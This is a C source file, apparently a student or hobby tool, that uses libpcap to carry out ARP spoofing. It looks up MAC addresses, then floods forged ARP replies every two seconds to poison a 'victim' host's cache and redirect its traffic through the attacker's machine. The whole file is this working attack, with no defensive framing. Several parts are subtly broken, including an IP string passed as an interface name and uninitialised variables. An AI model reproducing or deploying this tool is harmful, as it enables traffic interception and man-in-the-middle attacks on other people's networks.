#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

typedef struct ethernet{
	uint8_t dest[ETH_ALEN];
	uint8_t src[ETH_ALEN];
	uint16_t type;
} ethernet;

typedef struct arphdr { 
	uint16_t htype;    /* Hardware Type           */ 
	uint16_t ptype;    /* Protocol Type           */ 
	uint8_t hlen;        /* Hardware Address Length */ 
	uint8_t plen;        /* Protocol Address Length */ 
	uint16_t oper;     /* Operation Code          */ 
	uint8_t sha[6];      /* Sender hardware address */ 
	uint8_t spa[4];      /* Sender IP address       */ 
	uint8_t tha[6];      /* Target hardware address */ 
	uint8_t tpa[4];      /* Target IP address       */ 
}arphdr_t; 

#define ARP_REQUEST	1
#define ARP_REPLY	2

typedef struct arp_packet {
	ethernet ether;
	arphdr_t arp;
} arp_packet;

void getmac(const char *byte){
	int i;
	for(i = 0; i < 5; i++)
		printf("%02x:", *(uint8_t *)&byte[i]);
	printf("%02x\n", *(uint8_t *)&byte[i]);
}

void getMyMAC(const char *dev, uint8_t *mac){
	struct ifreq ifr;
	int s;
	if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
			perror("socket");
			return;
	}

	strcpy(ifr.ifr_name, dev);
	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
			perror("ioctl");
			return;
	}

	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(s);
}

void getMyIP(const char *dev, uint8_t *ip){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;

	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	memcpy(ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);
}

void getIPfromMAC(pcap_t *handle, const char *dev, uint8_t *targetip, uint8_t *targetmac){
	if(handle == NULL)
		return;

	arp_packet packet;

	memset(packet.ether.dest, 0xff, 6);
	getMyMAC(dev, packet.ether.src);

	packet.ether.type = htons(ETHERTYPE_ARP);

	packet.arp.htype = htons(1);
	packet.arp.ptype = htons(ETHERTYPE_IP);
	packet.arp.hlen = 6;
	packet.arp.plen = 4;
	packet.arp.oper = htons(ARP_REQUEST);

	memcpy(packet.arp.sha, packet.ether.src, ETHER_ADDR_LEN);
	getMyIP(dev, packet.arp.spa);
	memset(packet.arp.tha, 0x00, ETHER_ADDR_LEN);
	memcpy(packet.arp.tpa, targetip, 4);

	pcap_sendpacket(handle, (const uint8_t *)&packet, sizeof(arp_packet));

	arp_packet *result;
	struct pcap_pkthdr *header;
	int res;

	while(1){
		res = pcap_next_ex(handle, &header, (const u_char **)&result);
		if(res <= 0){
			printf("getIPfromMAC fail...\n");
			return;
		}

		if(!memcmp(result->ether.dest, packet.ether.src, 6))
			break;
	}
	memcpy(targetmac, result->arp.sha, 6);
}

void ARPSend(pcap_t *handle, const char *dev, uint16_t oper, uint8_t *senderip, uint8_t *sendermac, uint8_t *targetip, uint8_t *targetmac){
	if(handle == NULL)
		return;
	
	arp_packet packet;

	memcpy(packet.ether.dest, targetmac, 6);
	memcpy(packet.ether.src, sendermac, 6);

	packet.ether.type = htons(ETHERTYPE_ARP);

	packet.arp.htype = htons(1);
	packet.arp.ptype = htons(ETHERTYPE_IP);
	packet.arp.hlen = 6;
	packet.arp.plen = 4;
	packet.arp.oper = htons(oper);

	memcpy(packet.arp.sha, sendermac, ETHER_ADDR_LEN);
	memcpy(packet.arp.spa, senderip, 4);
	memcpy(packet.arp.tha, targetmac, ETHER_ADDR_LEN);
	memcpy(packet.arp.tpa, targetip, 4);

	pcap_sendpacket(handle, (const uint8_t *)&packet, sizeof(arp_packet));
}

int main(int argc, char *argv[])
{
		pcap_t *handle;			/* Session handle */
		char *dev;			/* The device to sniff on */
		char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
		struct bpf_program fp;		/* The compiled filter */
		char filter_exp[] = "arp";	/* The filter expression */
		bpf_u_int32 mask;		/* Our netmask */
		bpf_u_int32 net;		/* Our IP */
		struct pcap_pkthdr *header;	/* The header that pcap gives us */
		ethernet *eth;
		char *buf = NULL;
		//const u_char *packet;		/* The actual packet */
		int res;
		int i;

		if(argc != 4){
			printf("[Usage] ./pcap [interface] [sender_ip] [target_ip]\n");
			return 0;
		}

		/* Open the session in promiscuous mode */
		handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
				fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
				return(2);
		}
		/* Compile and apply the filter */
		if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
				fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
				return(2);
		}
		if (pcap_setfilter(handle, &fp) == -1) {
				fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
				return(2);
		}

		uint8_t sender_ip[INET_ADDRSTRLEN] = { 0, };
		uint8_t target_ip[INET_ADDRSTRLEN] = { 0, };

		inet_pton(AF_INET, argv[2], sender_ip);
		inet_pton(AF_INET, argv[3], target_ip);

		uint8_t mymac[6];
		uint8_t sender_mac[6];
		uint8_t target_mac[6];
		//getIPfromMAC(handle, argv[1], sender_ip, sender_mac);
		getMyMAC(argv[1], mymac);
		getIPfromMAC(handle, argv[1], sender_ip, sender_mac);
		getIPfromMAC(handle, argv[2], target_ip, target_mac);
		
		printf("victim mac : "); 
		getmac(target_mac);

		while(1){
			ARPSend(handle, argv[1], ARP_REPLY, target_ip, mymac, sender_ip, sender_mac);
			sleep(2);
		}

		pcap_close(handle);
		return(0);
}
